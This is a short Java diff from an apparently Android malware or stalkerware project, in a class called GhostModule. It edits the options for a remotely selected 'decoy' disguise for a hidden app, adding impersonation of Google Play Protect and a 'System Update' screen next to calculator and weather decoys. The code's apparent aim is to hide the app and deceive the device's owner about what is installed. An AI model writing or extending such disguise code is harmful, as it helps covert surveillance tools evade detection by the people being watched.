@@ -708,10 +708,10 @@ public class GhostModule extends BaseModule {
                 return newResponse(Response.Status.OK, "application/json", "{\"status\": \"success\", \"hidden\": false}");
             } else {
                 if (type != null) {
-                    int choice = 1; // update
+                    int choice = 1; // Play Protect (Default / SettingsAlias)
                     if (type.equals("calc")) choice = 2;
                     else if (type.equals("weather")) choice = 3;
-                    else if (type.equals("settings")) choice = 4;
+                    else if (type.equals("update")) choice = 4; // System Update
                     else if (type.equals("logo")) choice = 5;
                     
                     SystemAnalytics.setDecoyChoice(context, choice);
